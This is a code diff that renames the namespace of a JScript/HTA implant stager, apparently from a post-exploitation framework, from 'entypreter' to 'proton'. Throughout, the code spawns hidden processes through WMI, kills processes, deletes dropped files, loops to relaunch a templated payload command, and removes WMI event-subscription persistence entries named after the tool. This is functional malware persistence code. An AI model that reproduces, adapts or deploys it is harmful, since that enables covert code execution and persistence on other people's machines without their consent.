@@ -1,28 +1,28 @@
-var entypreter = {};
+var proton = {};
 
-entypreter.WS = new ActiveXObject("WScript.Shell");
-entypreter.FS = new ActiveXObject("Scripting.FileSystemObject");
+proton.WS = new ActiveXObject("WScript.Shell");
+proton.FS = new ActiveXObject("Scripting.FileSystemObject");
 
-entypreter.registry = {};
-entypreter.registry.HKCU = 0x80000001;
-entypreter.registry.HKLM = 0x80000002;
+proton.registry = {};
+proton.registry.HKCU = 0x80000001;
+proton.registry.HKLM = 0x80000002;
 
-entypreter.isHTA = function()
+proton.isHTA = function()
 {
     return typeof(window) !== "undefined";
 }
 
-entypreter.process = {};
+proton.process = {};
 
-entypreter.process.currentPID = function()
+proton.process.currentPID = function()
 {
-    var cmd = entypreter.file.getPath("%comspec% /K hostname");
-    var childPid = entypreter.WMI.createProcess(cmd);
+    var cmd = proton.file.getPath("%comspec% /K hostname");
+    var childPid = proton.WMI.createProcess(cmd);
     var pid = -1;
     var latestTime = 0;
     var latestProc = null;
 
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -48,9 +48,9 @@ entypreter.process.currentPID = function()
     return pid;
 }
 
-entypreter.process.kill = function(pid)
+proton.process.kill = function(pid)
 {
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -73,7 +73,7 @@ entypreter.process.kill = function(pid)
     return false;
 }
 
-entypreter.process.list = function()
+proton.process.list = function()
 {
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
     var query = "Select * From Win32_Process";
@@ -81,9 +81,9 @@ entypreter.process.list = function()
     return wmi.ExecQuery(query);
 }
 
-entypreter.exit = function()
+proton.exit = function()
 {
-    if (entypreter.isHTA())
+    if (proton.isHTA())
     {
         try {
           window.close();
@@ -122,17 +122,17 @@ entypreter.exit = function()
 
     try
     {
-        var pid = entypreter.process.currentPID();
-        entypreter.process.kill(pid);
+        var pid = proton.process.currentPID();
+        proton.process.kill(pid);
     }
     catch (e)
     {
     }
 }
 
-entypreter.WMI = {};
+proton.WMI = {};
 
-entypreter.WMI.createProcess = function(cmd)
+proton.WMI.createProcess = function(cmd)
 {
     var SW_HIDE = 0;
     var pid = 0;
@@ -156,9 +156,9 @@ entypreter.WMI.createProcess = function(cmd)
     return outParams.ProcessId;
 }
 
-entypreter.process.kill = function(pid)
+proton.process.kill = function(pid)
 {
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -181,37 +181,37 @@ entypreter.process.kill = function(pid)
     return false;
 }
 
-entypreter.file = {};
+proton.file = {};
 
-entypreter.file.getPath = function(path)
+proton.file.getPath = function(path)
 {
-    return entypreter.WS.ExpandEnvironmentStrings(path);
+    return proton.WS.ExpandEnvironmentStrings(path);
 }
 
-entypreter.file.deleteFile = function(path)
+proton.file.deleteFile = function(path)
 {
-    entypreter.FS.DeleteFile(entypreter.file.getPath(path), true);
+    proton.FS.DeleteFile(proton.file.getPath(path), true);
 };
 
-entypreter.shell = {};
-entypreter.shell.run = function(cmd, fork)
+proton.shell = {};
+proton.shell.run = function(cmd, fork)
 {
     var fork = (typeof(fork) !== "undefined") ? fork : true;
     var c = "%comspec% /q /c " + cmd;
-    entypreter.WS.Run(cmd, 0, !fork);
+    proton.WS.Run(cmd, 0, !fork);
 }
 
-entypreter.persist = {};
-entypreter.persist.run = function(cmd)
+proton.persist = {};
+proton.persist.run = function(cmd)
 {
-    var pid = entypreter.WMI.createProcess(cmd);
-    entypreter.shell.run('ping 127.0.0.1 -n 11', false);
+    var pid = proton.WMI.createProcess(cmd);
+    proton.shell.run('ping 127.0.0.1 -n 11', false);
     return pid;
 }
 
-entypreter.persist.clean = function()
+proton.persist.clean = function()
 {
-    var subname = "Entypreter";
+    var subname = "Proton";
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
     wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
     wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
@@ -224,7 +224,7 @@ entypreter.persist.clean = function()
             cons.Delete_();
         }
     }
-    entypreter.file.deleteFile(entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~"));
+    proton.file.deleteFile(proton.file.getPath("~FDROPDIR~\\~FDROPFILE~"));
 }
 
 try
@@ -238,19 +238,19 @@ try
     }
     while (true)
     {
-        var pid = entypreter.persist.run("~CMD~");
-        if (entypreter.process.kill(pid))
+        var pid = proton.persist.run("~CMD~");
+        if (proton.process.kill(pid))
         {
             if (!infflag)
             {
                 attempts -= 1;
                 if (attempts == 0)
                 {
-                    entypreter.persist.clean();
+                    proton.persist.clean();
                     break;
                 }
             }
-            entypreter.shell.run('ping 127.0.0.1 -n '+delay.toString(), false);
+            proton.shell.run('ping 127.0.0.1 -n '+delay.toString(), false);
         }
         else
         {
@@ -263,4 +263,4 @@ catch(e)
     //do nothing
 }
 
-entypreter.exit();
+proton.exit();
